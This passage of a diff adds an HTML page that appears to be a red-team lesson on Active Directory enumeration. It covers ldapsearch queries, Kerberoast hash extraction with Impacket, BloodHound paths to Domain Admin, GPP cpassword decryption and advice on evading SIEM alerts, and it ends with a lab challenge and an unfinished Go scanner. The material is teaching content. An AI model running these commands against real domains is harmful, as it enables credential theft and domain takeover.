+							attribute is a bitmask. Each bit represents a boolean property of the
+							user account. Understanding these bits lets you identify disabled accounts, accounts with non-expiring
+							passwords, accounts trusted for delegation, and more.
+						</p>
+						<pre class="plaintext">
+userAccountControl = 512  →  NORMAL_ACCOUNT (default new user)
+userAccountControl = 514  →  ACCOUNTDISABLE + NORMAL_ACCOUNT
+userAccountControl = 66048 → DONT_EXPIRE_PASSWORD + NORMAL_ACCOUNT
+userAccountControl = 544 → PASSWD_NOTREQD + NORMAL_ACCOUNT
+userAccountControl = 528384 → TRUSTED_FOR_DELEGATION + WORKSTATION_TRUST_ACCOUNT
+						</pre>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">Flag Name</th>
+									<th align="center">Value</th>
+									<th align="center">Meaning</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center"><code>SCRIPT</code></td>
+									<td align="center">0x0001 (1)</td>
+									<td align="center">Logon script will run</td>
+								</tr>
+								<tr>
+									<td align="center"><code>ACCOUNTDISABLE</code></td>
+									<td align="center">0x0002 (2)</td>
+									<td align="center">Account is disabled</td>
+								</tr>
+								<tr>
+									<td align="center"><code>HOMEDIR_REQUIRED</code></td>
+									<td align="center">0x0008 (8)</td>
+									<td align="center">Home folder required</td>
+								</tr>
+								<tr>
+									<td align="center"><code>LOCKOUT</code></td>
+									<td align="center">0x0010 (16)</td>
+									<td align="center">Account is locked out</td>
+								</tr>
+								<tr>
+									<td align="center"><code>PASSWD_NOTREQD</code></td>
+									<td align="center">0x0020 (32)</td>
+									<td align="center">No password required (dangerous)</td>
+								</tr>
+								<tr>
+									<td align="center"><code>PASSWD_CANT_CHANGE</code></td>
+									<td align="center">0x0040 (64)</td>
+									<td align="center">User cannot change password</td>
+								</tr>
+								<tr>
+									<td align="center"><code>ENCRYPTED_TEXT_PWD_ALLOWED</code></td>
+									<td align="center">0x0080 (128)</td>
+									<td align="center">Store password under reversible encryption (same as cleartext)</td>
+								</tr>
+								<tr>
+									<td align="center"><code>TEMP_DUPLICATE_ACCOUNT</code></td>
+									<td align="center">0x0100 (256)</td>
+									<td align="center">Local account for users of another domain</td>
+								</tr>
+								<tr>
+									<td align="center"><code>NORMAL_ACCOUNT</code></td>
+									<td align="center">0x0200 (512)</td>
+									<td align="center">Default account type (user object)</td>
+								</tr>
+								<tr>
+									<td align="center"><code>INTERDOMAIN_TRUST_ACCOUNT</code></td>
+									<td align="center">0x0800 (2048)</td>
+									<td align="center">Trust between two domains</td>
+								</tr>
+								<tr>
+									<td align="center"><code>WORKSTATION_TRUST_ACCOUNT</code></td>
+									<td align="center">0x1000 (4096)</td>
+									<td align="center">Computer account</td>
+								</tr>
+								<tr>
+									<td align="center"><code>SERVER_TRUST_ACCOUNT</code></td>
+									<td align="center">0x2000 (8192)</td>
+									<td align="center">Domain Controller's computer account</td>
+								</tr>
+								<tr>
+									<td align="center"><code>DONT_EXPIRE_PASSWORD</code></td>
+									<td align="center">0x10000 (65536)</td>
+									<td align="center">Password never expires</td>
+								</tr>
+								<tr>
+									<td align="center"><code>MNS_LOGON_ACCOUNT</code></td>
+									<td align="center">0x20000 (131072)</td>
+									<td align="center">Majority Node Set logon</td>
+								</tr>
+								<tr>
+									<td align="center"><code>SMARTCARD_REQUIRED</code></td>
+									<td align="center">0x40000 (262144)</td>
+									<td align="center">Smart card required for interactive logon</td>
+								</tr>
+								<tr>
+									<td align="center"><code>TRUSTED_FOR_DELEGATION</code></td>
+									<td align="center">0x80000 (524288)</td>
+									<td align="center">Unconstrained delegation allowed</td>
+								</tr>
+								<tr>
+									<td align="center"><code>NOT_DELEGATED</code></td>
+									<td align="center">0x100000 (1048576)</td>
+									<td align="center">CANNOT be delegated (protection flag)</td>
+								</tr>
+								<tr>
+									<td align="center"><code>USE_DES_KEY_ONLY</code></td>
+									<td align="center">0x200000 (2097152)</td>
+									<td align="center">Only DES encryption for Kerberos</td>
+								</tr>
+								<tr>
+									<td align="center"><code>DONT_REQ_PREAUTH</code></td>
+									<td align="center">0x400000 (4194304)</td>
+									<td align="center">Kerberos pre-authentication NOT required (AS-REP roastable)</td>
+								</tr>
+								<tr>
+									<td align="center"><code>PASSWORD_EXPIRED</code></td>
+									<td align="center">0x800000 (8388608)</td>
+									<td align="center">Password has expired</td>
+								</tr>
+								<tr>
+									<td align="center"><code>TRUSTED_TO_AUTH_FOR_DELEGATION</code></td>
+									<td align="center">0x1000000 (16777216)</td>
+									<td align="center">Protocol Transition (S4U2self) with constrained delegation</td>
+								</tr>
+							</tbody>
+						</table>
+						<pre class="bash">
+# Find all accounts with AS-REP roast potential
+ldapsearch -x -H ldap://10.0.0.1 \
+    -D &#34;jsmith@corp.local&#34; -w &#39;password&#39; \
+    -b &#34;DC=corp,DC=local&#34; \
+    &#34;(&amp;(objectclass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))&#34; \
+    cn samaccountname useraccountcontrol 2&gt;/dev/null
+
+# 1.2.840.113556.1.4.803 is the LDAP_MATCHING_RULE_BIT_AND rule
+# It performs a bitwise AND and returns objects where any flag matches
+
+# Find all accounts trusted for unconstrained delegation
+ldapsearch -x -H ldap://10.0.0.1 \
+    -D &#34;jsmith@corp.local&#34; -w &#39;password&#39; \
+    -b &#34;DC=corp,DC=local&#34; \
+    &#34;(&amp;(objectclass=user)(userAccountControl:1.2.840.113556.1.4.803:=524288))&#34; \
+    cn samaccountname 2&gt;/dev/null
+						</pre>
+						<h4 id="kerberoastable-service-accounts">Kerberoastable Service Accounts</h4>
+						<p>
+							<abbr title="Service Principal Name">SPN</abbr>
+							s map a service to a user or computer account. When a user requests
+							a TGS for an
+							<abbr title="Service Principal Name">SPN</abbr>
+							, the K
+							<abbr title="Domain Controller">DC</abbr>
+							encrypts the service
+							ticket with the service account's Kerberos key (derived from its password). If the service runs
+							as a domain user, the ticket can be cracked offline - this is
+							<b>Kerberoasting</b>
+							.
+						</p>
+						<p>
+							Every
+							<abbr title="Service Principal Name">SPN</abbr>
+							in the domain represents a potentially crackable service
+							account credential.
+						</p>
+						<pre class="bash">
+# Enumerate all SPNs in the domain
+ldapsearch -x -H ldap://10.0.0.1 \
+    -D &#34;jsmith@corp.local&#34; -w &#39;password&#39; \
+    -b &#34;DC=corp,DC=local&#34; \
+    &#34;(&amp;(objectclass=user)(servicePrincipalName=*))&#34; \
+    cn samaccountname serviceprincipalname memberof distinguishedname 2&gt;/dev/null
+
+# Common SPN formats and what they reveal:
+# HTTP/webserver.corp.local          → IIS or web service
+# MSSQLSvc/sql01.corp.local:1433     → SQL Server (standard port)
+# MSSQLSvc/sql01.corp.local:49732    → SQL Server (dynamic port — likely a named instance)
+# TERMSRV/ts01.corp.local            → Terminal Services / Remote Desktop
+# HOST/computer.corp.local           → Host SPN (present on every computer account)
+# CIFS/fileserver.corp.local         → File server (SMB)
+# exchangeMDB/ex01.corp.local        → Exchange Server
+# WSMAN/computer.corp.local          → WinRM (PowerShell Remoting)
+# vssvc/computer.corp.local          → Volume Shadow Copy service
+# oracle/orcl.corp.local             → Oracle Database
+						</pre>
+						<pre class="bash">
+# Also use Impacket&#39;s GetUserSPNs.py for a cleaner SPN listing
+GetUserSPNs.py -dc-ip 10.0.0.1 corp.local/jsmith:password
+
+# Request a TGS ticket for every SPN (Kerberoast) — IMPACKET
+GetUserSPNs.py -dc-ip 10.0.0.1 corp.local/jsmith:password -request -outputfile kerberoast-hashes.txt
+
+# Output file contains entries like:
+# $krb5tgs$23$*svc_sql$CORP.LOCAL$corp.local/svc_sql*$ab12...hash...
+# Hashcat mode: -m 13100 (RC4-HMAC) or -m 19700 (AES256)
+						</pre>
+						<h4 id="bloodhound-data-collection">BloodHound Data Collection</h4>
+						<p>
+							BloodHound is the most effective tool for understanding privilege relationships in Active Directory.
+							It does not enumerate objects individually - it maps relationships: who has sessions on what
+							machine, who is a member of what group, who has what
+							<abbr title="Access Control List">ACL</abbr>
+							rights over
+							what object.
+						</p>
+						<p>
+							The ingestor collects this data by running
+							<abbr title="Lightweight Directory Access Protocol">LDAP</abbr>
+							queries,
+							checking local admin group memberships, and resolving group memberships recursively.
+						</p>
+						<pre class="bash">
+# Install BloodHound (the GUI) and the Python ingestor
+yay -S bloodhound
+pip install bloodhound  # Provides the bloodhound-python ingestor
+
+# Run the Python ingestor from Linux — all collection methods
+bloodhound-python \
+    -d corp.local \
+    -u jsmith \
+    -p &#39;password&#39; \
+    -gc dc01.corp.local \
+    -c All \
+    -ns 10.0.0.1 \
+    --zip \
+    -dc dc01.corp.local
+
+# -c All : Collect all group memberships, user properties, computer properties,
+#          sessions, ACLs, trusts, GPOs, and container structure
+# --zip  : Output as a single ZIP file ready for import into BloodHound GUI
+
+# If you cannot resolve DNS names from your attacker machine:
+bloodhound-python \
+    -d corp.local \
+    -u jsmith \
+    -p &#39;password&#39; \
+    -ns 10.0.0.1 \
+    -dc dc01.corp.local \
+    -gc dc01.corp.local \
+    -c All \
+    --dns-tcp \
+    --zip
+
+# Collection methods breakdown:
+# Group           →  group memberships (recursive)
+# LocalAdmin      →  local admin group memberships on each computer
+# Session         →  who is logged into what machine (NetSessionEnum)
+# ACL             →  access control entries on all objects
+# Trusts          →  intra-forest and inter-forest trusts
+# ObjectProps     →  object attributes (SPNs, UAC, OS, etc.)
+# Container       →  OU/container hierarchy
+# DCOM            →  DCOM user/computer list
+# RDP             →  Remote Desktop Users local group membership
+# PSRemote        →  PowerShell Remoting group membership
+# LoggedOn        →  logged-on users (requires local admin on target)
+# SQLAdmin        →  SQL Server admin group membership
+						</pre>
+						<pre class="bash">
+# Start the BloodHound GUI (Neo4j must be running)
+sudo pacman -S neo4j-community
+sudo neo4j start
+# Default credentials: neo4j:neo4j  (change on first login)
+
+bloodhound --no-sandbox
+# Import the ZIP from bloodhound-python via the Upload button
+						</pre>
+						<h4 id="bloodhound-path-to-domain-admin">BloodHound Path to Domain Admin</h4>
+						<p>
+							Once the data is loaded, BloodHound's graph analysis answers the questions that would take hours
+							of manual analysis:
+						</p>
+						<p>
+							<b>"Shortest Path to Domain Admins"</b>
+							- the most commonly used query. Finds which compromised
+							user provides the shortest path to members of the Domain Admins group.
+						</p>
+						<p>Common attack paths revealed by BloodHound:</p>
+						<pre class="plaintext">
+1. User has LocalAdmin on Workstation → DA has Session on that Workstation
+   → Steal DA token/credential from the workstation → DA access
+
+2. User has GenericAll on a group → add self to group → group is a member of DA
+   → DA access
+
+3. User has ForceChangePassword on a DA member → change DA&#39;s password
+   → DA access (by logging in as the DA)
+
+4. User has WriteDacl on a GPO applied to a DA&#39;s machine → modify GPO to
+   run a startup script → DA&#39;s machine executes script on boot → DA access
+
+5. User is a member of Account Operators → can modify any non-privileged
+   account → compromise a user with a path to DA → DA access
+
+6. User has AddAllowedToAct/GenericWrite on a computer where DA has session
+   → abuse Resource-Based Constrained Delegation → DA access
+						</pre>
+						<pre class="bash">
+# BloodHound Custom Cypher queries (run in the Raw Query panel):
+
+# Find all users with SPNs (kerberoastable)
+MATCH (u:User {hasspn: true}) RETURN u.name, u.serviceprincipalnames
+
+# Find all computers with unconstrained delegation
+MATCH (c:Computer {unconstraineddelegation: true}) RETURN c.name
+
+# Find all users with constrained delegation
+MATCH (u:User) WHERE u.allowedtodelegate IS NOT NULL RETURN u.name, u.allowedtodelegate
+
+# Find all users with DONT_REQ_PREAUTH (AS-REP roastable)
+MATCH (u:User {dontreqpreauth: true}) RETURN u.name
+
+# Find all Domain Admins
+MATCH (u:User)-[:MemberOf*1..]-&gt;(g:Group {name: &#39;DOMAIN ADMINS@CORP.LOCAL&#39;})
+RETURN u.name
+
+# Find all groups with &#39;Admin&#39; in the name
+MATCH (g:Group) WHERE g.name CONTAINS &#39;ADMIN&#39; RETURN g.name
+
+# Find computers where Domain Admins have sessions
+MATCH (u:User)-[:MemberOf*1..]-&gt;(g:Group {name: &#39;DOMAIN ADMINS@CORP.LOCAL&#39;})
+MATCH (u)-[:HasSession]-&gt;(c:Computer)
+RETURN u.name, c.name
+
+# Find users with GenericAll on the Domain Admins group
+MATCH (u1:User)-[r:GenericAll]-&gt;(g:Group {name: &#39;DOMAIN ADMINS@CORP.LOCAL&#39;})
+RETURN u1.name
+						</pre>
+						<h4 id="group-enumeration-key-groups">Group Enumeration - Key Groups</h4>
+						<p>Understanding group hierarchy is essential. Here are the groups every red teamer should know:</p>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">Group</th>
+									<th align="center">RID</th>
+									<th align="center">Why It Matters</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center"><b>Domain Admins</b></td>
+									<td align="center">512</td>
+									<td align="center">Can administer any machine in the domain, including DCs. The primary goal of most red team engagements.</td>
+								</tr>
+								<tr>
+									<td align="center"><b>Enterprise Admins</b></td>
+									<td align="center">519</td>
+									<td align="center">Can administer any domain in the forest. Exists only in the forest root domain, but its members are granted membership in every domain's Domain Admins group.</td>
+								</tr>
+								<tr>
+									<td align="center"><b>Schema Admins</b></td>
+									<td align="center">518</td>
+									<td align="center">Can modify the AD schema (add new attributes/classes). Exists only in the forest root domain.</td>
+								</tr>
+								<tr>
+									<td align="center"><b>Administrators</b></td>
+									<td align="center">544</td>
+									<td align="center">Built-in local admin on a specific server. Domain Admins are automatically members.</td>
+								</tr>
+								<tr>
+									<td align="center"><b>Account Operators</b></td>
+									<td align="center">548</td>
+									<td align="center">Can create/modify/delete users and groups EXCEPT administrative accounts/groups. Path to DA via targeted privilege escalation.</td>
+								</tr>
+								<tr>
+									<td align="center"><b>Backup Operators</b></td>
+									<td align="center">551</td>
+									<td align="center">Can back up and restore files, including NTDS.dit (the domain database) via shadow copies. Path to DCSync.</td>
+								</tr>
+								<tr>
+									<td align="center"><b>Server Operators</b></td>
+									<td align="center">549</td>
+									<td align="center">Can log onto a DC locally, start/stop services, manage shares, and backup files.</td>
+								</tr>
+								<tr>
+									<td align="center"><b>DNS Admins</b></td>
+									<td align="center">-</td>
+									<td align="center">Can manage DNS server. Often allows DLL loading on the DNS server (which is typically a DC) -> SYSTEM on DC.</td>
+								</tr>
+								<tr>
+									<td align="center"><b>Print Operators</b></td>
+									<td align="center">550</td>
+									<td align="center">Can manage printers, load/unload printer drivers on DCs -> kernel-mode driver load -> SYSTEM on DC.</td>
+								</tr>
+								<tr>
+									<td align="center"><b>Remote Desktop Users</b></td>
+									<td align="center">555</td>
+									<td align="center">Can RDP to a machine. If a DA uses RDP and leaves a session, session hijacking may be possible.</td>
+								</tr>
+								<tr>
+									<td align="center"><b>Protected Users</b></td>
+									<td align="center">525</td>
+									<td align="center">A hardened group. Members cannot use NTLM, DES, or RC4 for Kerberos. CredSSP and wdigest are disabled. Kerberos delegation cache is not supported.</td>
+								</tr>
+							</tbody>
+						</table>
+						<pre class="bash">
+# ldapsearch query for group membership (Domain Admins example)
+ldapsearch -x -H ldap://10.0.0.1 \
+    -D &#34;jsmith@corp.local&#34; -w &#39;password&#39; \
+    -b &#34;DC=corp,DC=local&#34; \
+    &#34;(&amp;(objectclass=group)(samaccountname=Domain Admins))&#34; \
+    cn samaccountname member 2&gt;/dev/null
+
+# Resolve member DNs to samaccountnames
+ldapsearch -x -H ldap://10.0.0.1 \
+    -D &#34;jsmith@corp.local&#34; -w &#39;password&#39; \
+    -b &#34;CN=Administrator,CN=Users,DC=corp,DC=local&#34; \
+    &#34;(objectclass=user)&#34; samaccountname 2&gt;/dev/null
+						</pre>
+						<h4 id="computer-enumeration">Computer Enumeration</h4>
+						<p>Computers in AD have attributes that reveal their purpose, patch level, and activity:</p>
+						<pre class="bash">
+ldapsearch -x -H ldap://10.0.0.1 \
+    -D &#34;jsmith@corp.local&#34; -w &#39;password&#39; \
+    -b &#34;DC=corp,DC=local&#34; \
+    &#34;(objectclass=computer)&#34; \
+    cn samaccountname operatingsystem operatingsystemversion lastlogontimestamp \
+    pwdlastset whencreated dnsHostName serviceprincipalname \
+    2&gt;/dev/null | grep -v &#39;^#&#39; | grep -v &#39;^$&#39;
+						</pre>
+						<p>Key computer attributes:</p>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">Attribute</th>
+									<th align="center">Meaning</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center"><code>operatingSystem</code></td>
+									<td align="center">Human-readable OS (e.g.<code>Windows Server 2019 Standard</code>)</td>
+								</tr>
+								<tr>
+									<td align="center"><code>operatingSystemVersion</code></td>
+									<td align="center">Numeric version (e.g.<code>10.0 (17763)</code>)</td>
+								</tr>
+								<tr>
+									<td align="center"><code>lastLogonTimestamp</code></td>
+									<td align="center">Last interactive logon (replicated, up to 14-day lag). If recent, the machine is actively used.</td>
+								</tr>
+								<tr>
+									<td align="center"><code>dnsHostName</code></td>
+									<td align="center">FQDN of the computer</td>
+								</tr>
+								<tr>
+									<td align="center"><code>servicePrincipalName</code></td>
+									<td align="center">SPNs hosted (e.g.<code>HOST/</code>,<code>CIFS/</code>,<code>TERMSRV/</code>) - reveals roles</td>
+								</tr>
+								<tr>
+									<td align="center"><code>pwdLastSet</code></td>
+									<td align="center">When the computer's machine account password was last changed (default: every 30 days)</td>
+								</tr>
+								<tr>
+									<td align="center"><code>whenCreated</code></td>
+									<td align="center">When the computer was joined to the domain</td>
+								</tr>
+								<tr>
+									<td align="center"><code>userAccountControl</code></td>
+									<td align="center">Flags -<code>WORKSTATION_TRUST_ACCOUNT</code>(4096) for workstations,<code>SERVER_TRUST_ACCOUNT</code>(8192) for DCs</td>
+								</tr>
+							</tbody>
+						</table>
+						<pre class="bash">
+# Convert lastLogonTimestamp (Windows FILETIME) to human-readable
+echo &#39;132500000000000000&#39; | \
+    python3 -c &#39;
+import sys, datetime
+ft = int(sys.stdin.read().strip())
+if ft &gt; 0:
+    dt = datetime.datetime(1601,1,1) + datetime.timedelta(microseconds=ft/10)
+    print(dt.isoformat())
+else:
+    print(&#34;Never&#34;)
+&#39;
+						</pre>
+						<h4 id="gpo-enumeration">GPO Enumeration</h4>
+						<p>
+							Group Policy Objects apply configuration (scripts, startup items, registry changes, security
+							settings) to users and computers. A single
+							<abbr title="Group Policy Object">GPO</abbr>
+							applied to a Domain Controller
+							can run arbitrary code as SYSTEM on every
+							<abbr title="Domain Controller">DC</abbr>
+							.
+							<abbr title="Group Policy Object">GPO</abbr>
+							s are stored in
+							<code>\\domain.local\SYSVOL\domain.local\Policies\{GUID}\</code>
+							.
+						</p>
+						<pre class="bash">
+# Enumerate all GPOs via LDAP
+ldapsearch -x -H ldap://10.0.0.1 \
+    -D &#34;jsmith@corp.local&#34; -w &#39;password&#39; \
+    -b &#34;DC=corp,DC=local&#34; \
+    &#34;(objectclass=groupPolicyContainer)&#34; \
+    cn displayname distinguishedname gPCFileSysPath 2&gt;/dev/null | grep -v &#39;^#&#39;
+
+# GPCFileSysPath example:
+# gPCFileSysPath: \\corp.local\SysVol\corp.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}
+# This GUID {6AC1786C-016F-11D2-945F-00C04FB984F9} is the Default Domain Policy
+
+# List GPO contents (if a null session or credential gives SMB access):
+smbclient //10.0.0.1/SYSVOL -U &#34;corp.local/jsmith%password&#34; \
+    -c &#34;recurse; ls&#34;
+
+# Key GPO files to look for in the Machine/User subdirectories:
+# registry.pol      →  registry-based policy settings
+# Groups.xml        →  local group membership definitions (often contains passwords)
+# Services.xml      →  service configuration (can specify RunAs credentials)
+# ScheduledTasks.xml → scheduled task definitions
+# Scripts/          →  logon/logoff/startup/shutdown scripts
+# DriveMaps.xml     →  mapped network drives
+# DataSources.xml   →  ODBC data sources
+						</pre>
+						<pre class="bash">
+# Extract cPassword from Groups.xml (decryptable — MS14-025)
+# The cpassword field in Groups.xml is AES-256-CBC encrypted with a static key
+# published by Microsoft. Any cpassword found is trivially decryptable.
+# Use the gpp-decrypt tool (from impacket):
+gpp-decrypt &#34;cpassword_value_from_Groups.xml&#34;
+
+# Or search SYSVOL for cpassword strings:
+smbclient //10.0.0.1/SYSVOL -U &#34;corp.local/jsmith%password&#34; \
+    -c &#34;recurse; prompt OFF; mget *&#34; 2&gt;/dev/null
+grep -r &#34;cpassword&#34; SYSVOL_contents/  # path varies by mount
+						</pre>
+						<h4 id="trust-enumeration">Trust Enumeration</h4>
+						<p>
+							Trusts allow authentication across domain boundaries. A trust from Domain A to Domain B means
+							Domain B trusts Domain A - users from Domain A can access resources in Domain B.
+						</p>
+						<pre class="bash">
+# LDAP query for all trusted domains
+ldapsearch -x -H ldap://10.0.0.1 \
+    -D &#34;jsmith@corp.local&#34; -w &#39;password&#39; \
+    -b &#34;DC=corp,DC=local&#34; \
+    &#34;(objectclass=trustedDomain)&#34; \
+    cn distinguishedname trustAttributes trustDirection trustType \
+    trustPartner flatName securityIdentifier 2&gt;/dev/null
+						</pre>
+						<p>Trust attribute reference:</p>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">Attribute</th>
+									<th align="center">Values</th>
+									<th align="center">Meaning</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center"><code>trustDirection</code></td>
+									<td align="center">0 = disabled, 1 = inbound, 2 = outbound, 3 = bidirectional</td>
+									<td align="center">Who trusts whom</td>
+								</tr>
+								<tr>
+									<td align="center"><code>trustType</code></td>
+									<td align="center">1 = downlevel (NT4), 2 = uplevel (AD), 3 = MIT (Kerberos realm), 4 = DCE (old)</td>
+									<td align="center">The technology</td>
+								</tr>
+								<tr>
+									<td align="center"><code>trustAttributes</code></td>
+									<td align="center">bitmask: 1 = non-transitive, 2 = uplevel only, 4 = quarantined (SID filtering), 8 = forest transitive, 16 = cross-org, 32 = intra-forest, 64 = treat as external, 128 = RC4 encryption, 1024 = PIM trust</td>
+									<td align="center">Trust properties</td>
+								</tr>
+							</tbody>
+						</table>
+						<pre class="bash">
+# Impacket&#39;s Get-ADTrust.py (part of Impacket scripts)
+# Lists trusts with resolved direction and attributes
+python3 /usr/share/doc/python-impacket/examples/Get-ADTrust.py \
+    -dc-ip 10.0.0.1 corp.local/jsmith:password
+						</pre>
+						<p>
+							<b>Critical</b>
+							: If
+							<code>trustAttributes</code>
+							does NOT have bit 4 (quarantined/SID filtering), SID history
+							forgery is possible across the trust. You can inject a SID from Domain A into a Kerberos ticket
+							for Domain B, and if Domain B trusts Domain A, you get access as that SID in Domain B.
+						</p>
+						<h4 id="acl-privilege-escalation-paths">ACL Privilege Escalation Paths</h4>
+						<p>
+							Access Control Entries (ACEs) on domain objects grant permissions to users and groups. Certain
+							ACEs grant rights that can be abused for privilege escalation:
+						</p>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">ACE Right</th>
+									<th align="center">Abuses</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center"><code>GenericAll</code></td>
+									<td align="center">Full control over the object. Can reset a user's password, add self to a group, modify group membership.</td>
+								</tr>
+								<tr>
+									<td align="center"><code>GenericWrite</code></td>
+									<td align="center">Write to any property. Can write to<code>servicePrincipalName</code>to perform targeted Kerberoasting, or write<code>logonScript</code>to execute code on next login.</td>
+								</tr>
+								<tr>
+									<td align="center"><code>WriteOwner</code></td>
+									<td align="center">Change the owner of the object. Once owner, grant self<code>GenericAll</code>.</td>
+								</tr>
+								<tr>
+									<td align="center"><code>WriteDACL</code></td>
+									<td align="center">Modify the object's ACL (add new ACEs). Grant self<code>GenericAll</code>.</td>
+								</tr>
+								<tr>
+									<td align="center"><code>AllExtendedRights</code></td>
+									<td align="center">All extended rights. Includes<code>ForceChangePassword</code>(reset user password without knowing the old one).</td>
+								</tr>
+								<tr>
+									<td align="center"><code>ForceChangePassword</code></td>
+									<td align="center">Reset the user's password.</td>
+								</tr>
+								<tr>
+									<td align="center"><code>AddMember</code>/<code>AddSelf</code></td>
+									<td align="center">Add a member to a group. Add yourself.</td>
+								</tr>
+								<tr>
+									<td align="center"><code>Self</code></td>
+									<td align="center">Write-validated right. Can add self to groups via<code>Self-Membership</code>.</td>
+								</tr>
+								<tr>
+									<td align="center"><code>ExtendedRight</code></td>
+									<td align="center">Specific extended rights:<code>User-Force-Change-Password</code>,<code>User-Enable-Disable-Account</code>,<code>Allowed-To-Authenticate</code>(RBCD).</td>
+								</tr>
+								<tr>
+									<td align="center"><code>ExtendedRight: DS-Replication-Get-Changes</code></td>
+									<td align="center">DCSync right - replicate credentials from the DC.</td>
+								</tr>
+								<tr>
+									<td align="center"><code>ExtendedRight: DS-Replication-Get-Changes-All</code></td>
+									<td align="center">DCSync right - replicate filtered attributes (includes password hashes).</td>
+								</tr>
+							</tbody>
+						</table>
+						<pre class="bash">
+# BloodHound is the primary tool for ACL analysis.
+# Enable ACL collection:
+bloodhound-python -d corp.local -u jsmith -p &#39;password&#39; \
+    -ns 10.0.0.1 -dc dc01.corp.local -gc dc01.corp.local \
+    -c ACL,Group,ObjectProps --zip
+
+# In BloodHound GUI, search for a user, right-click → &#34;Shortest Paths to Domain Admins&#34;
+# Look for ACL edges (dashed lines):
+#   GenericAll → yellow dashed line
+#   WriteDacl → orange dashed line
+#   ForceChangePassword → red dashed line
+#   AddMember → green dashed line
+						</pre>
+						<pre class="bash">
+# Manual ACL enumeration for a specific object via ldapsearch
+# View ntSecurityDescriptor for the Domain Admins group
+ldapsearch -x -H ldap://10.0.0.1 \
+    -D &#34;jsmith@corp.local&#34; -w &#39;password&#39; \
+    -b &#34;CN=Domain Admins,CN=Users,DC=corp,DC=local&#34; \
+    -s base &#34;(objectclass=*)&#34; ntSecurityDescriptor 2&gt;/dev/null
+
+# The ntSecurityDescriptor is a binary blob — decode with ldapdomaindump
+pip install ldapdomaindump
+ldapdomaindump -u &#39;corp.local\jsmith&#39; -p &#39;password&#39; ldap://10.0.0.1
+
+# ldapdomaindump outputs:
+# domain_users.json       → all users with attributes
+# domain_groups.json      → all groups with members
+# domain_computers.json   → all computers with OS and attributes
+# domain_policy.json      → password policy, lockout policy
+# domain_trusts.json      → trust relationships
+# domain_users_by_group.html  → useful for quick review
+# domain_users.html        → HTML table of all users
+						</pre>
+					</section>
+					<section>
+						<h3 id="common-mistakes">Common Mistakes</h3>
+						<p>
+							<b>Trusting enum4linux output without verification.</b>
+							If
+							<abbr title="Server Message Block">SMB</abbr>
+							null sessions
+							are blocked, enum4linux returns empty results. Always verify with an alternative method (rpcclient,
+							kerbrute, or
+							<abbr title="Lightweight Directory Access Protocol">LDAP</abbr>
+							anonymous bind).
+						</p>
+						<p>
+							<b>Not saving the domain SID.</b>
+							You need the domain SID for Golden Ticket attacks, SID history
+							injection, and BloodHound understanding. Run
+							<code>rpcclient -c &#34;lsaquery&#34;</code>
+							and save it immediately.
+						</p>
+						<p>
+							<b>Ignoring computer accounts.</b>
+							Computer accounts can be compromised just like user accounts.
+							Their machine account passwords are rotated every 30 days by default, but the
+							<abbr title="NT LAN Manager">NTLM</abbr>
+							hash can be extracted, and the computer account has
+							<abbr title="Service Principal Name">SPN</abbr>
+							s (
+							<code>HOST/</code>
+							,
+							<code>CIFS/</code>
+							,
+							<code>TERMSRV/</code>
+							). Kerberoasting a computer account yields a password that lets you authenticate
+							as the machine - often useful for S4U2self abuse.
+						</p>
+						<p>
+							<b>Running BloodHound collection from a non-domain-joined Linux host without '-ns'.</b>
+							If
+							<abbr title="Domain Name System">DNS</abbr>
+							for the target domain is not resolvable from your attacker machine, BloodHound-python will fail
+							silently or connect to the wrong
+							<abbr title="Domain Controller">DC</abbr>
+							. Always specify
+							<code>-ns</code>
+							(nameserver)
+							and
+							<code>-dc</code>
+							(domain controller
+							<abbr title="Internet Protocol">IP</abbr>
+							) explicitly.
+						</p>
+						<p>
+							<b>Over-enumerating in one session.</b>
+							Running every enumeration tool in sequence from a single
+							<abbr title="Internet Protocol">IP</abbr>
+							with a single user account triggers
+							<abbr title="Security Information and Event Management">SIEM</abbr>
+							alerts (Event ID 4662 for
+							<abbr title="Lightweight Directory Access Protocol">LDAP</abbr>
+							queries). Spread enumeration
+							across time, across source
+							<abbr title="Internet Protocol">IP</abbr>
+							s, and across different accounts where possible.
+						</p>
+					</section>
+					<section>
+						<h3 id="challenge">Challenge</h3>
+						<p>
+							Domain enumeration needs a live Active Directory forest, which does not fit in a lightweight
+							container because the domain controllers are Windows Server hosts. The practical options are:
+						</p>
+						<ol>
+							<li><b>Automated lab</b> - use <a class="icon-github" href="https://github.com/Orange-Cyberdefense/GOAD" target="_blank">GOAD</a> to provision a multi-domain, multi-forest lab with Vagrant and VirtualBox or ESXi.</li>
+							<li><b>Manual lab</b> - deploy a Windows Server 2022 <abbr title="Virtual Machine">VM</abbr> , promote it to a <abbr title="Domain Controller">DC</abbr> , create service accounts, and attack from a Linux <abbr title="Virtual Machine">VM</abbr> on the same segment.</li>
+							<li><b>Cloud</b> - use an Azure AD Connect test tenant or Amazon Web Services Directory Service.</li>
+						</ol>
+						<p>
+							Create at least one Domain Admin, three low-privileged users, an
+							<abbr title="Service Principal Name">SPN</abbr>
+							service account, an account with
+							<code>UF_DONT_REQUIRE_PREAUTH</code>
+							, and one computer with unconstrained
+							delegation so every technique has a target.
+						</p>
+						<p>
+							The coding challenge is a Go SRV scanner that queries a domain controller directly for the records
+							every AD client relies on. It bypasses the local resolver by dialing the supplied nameserver,
+							so it works from a host that is not joined to the domain.
+						</p>
+						<pre class="go">
+package main
+
+import (
+	&#34;context&#34;
+	&#34;fmt&#34;
+	&#34;net&#34;
+	&#34;os&#34;
+	&#34;time&#34;
+)
+
+func lookup(resolver *net.Resolver, service, proto, domain string) {
+	_, records, err := resolver.LookupSRV(context.Background(), service, proto, domain)
+	if err != nil {
+		fmt.Printf(&#34;[-] _%s._%s.%s: %v\n&#34;, service, proto, domain, err)
+		return
+	}
+	for _, r := range records {
